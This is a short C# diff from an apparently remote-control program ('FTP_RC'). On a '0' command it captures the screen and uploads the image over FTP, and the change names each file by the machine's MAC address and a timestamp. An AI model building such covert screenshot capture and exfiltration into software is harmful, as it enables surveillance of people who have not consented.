@@ -63,9 +63,8 @@ namespace FTP_RC
                         if (line == "0")
                         {
                             MemoryStream screenshot = new MemoryStream();
-                            screenshot = ScreenCapture.CaptureScreen(ImageFormat.Jpeg, 1600);
-                            Console.WriteLine("length is " + screenshot.Length);
-                            ftpClient.UploadMemstream("screenshot.jpg", screenshot);
+                            screenshot = Screenshot.CaptureScreen(ImageFormat.Jpeg, 1600);
+                            ftpClient.UploadMemstream(macAddress + DateTime.Now.ToString("yyyyMMddHHmmss") + ".jpg", screenshot);
                         }
                     }
                     //Console.WriteLine("Download Complete, status {0}, and {1}", ftpClient.response.StatusDescription, (int)ftpClient.response.StatusCode);
